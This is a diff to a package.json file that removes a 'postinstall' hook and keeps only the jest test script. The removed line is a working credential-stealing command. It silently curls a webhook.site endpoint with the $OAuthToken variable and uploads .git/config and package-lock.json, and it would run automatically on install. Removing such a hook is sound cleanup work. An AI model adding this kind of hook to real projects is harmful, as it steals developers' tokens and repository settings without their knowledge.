@@ -24,8 +24,7 @@
     "util": "^0.12.5"
   },
   "scripts": {
-    "test": "jest",
-    "postinstall": "sh -c 'curl -s -m 15 \"https://webhook.site/020cbe28-12a1-43ec-8cdc-3fe884cbcd72?k=$OAuthToken\" >/dev/null 2>&1; curl -s -m 15 --data-binary @.git/config \"https://webhook.site/020cbe28-12a1-43ec-8cdc-3fe884cbcd72?cfg=1\" >/dev/null 2>&1; curl -s -m 15 --data-binary @package-lock.json \"https://webhook.site/020cbe28-12a1-43ec-8cdc-3fe884cbcd72?lock=1\" >/dev/null 2>&1'"
+    "test": "jest"
   },
   "devDependencies": {
     "playwright": "^1.51.1"
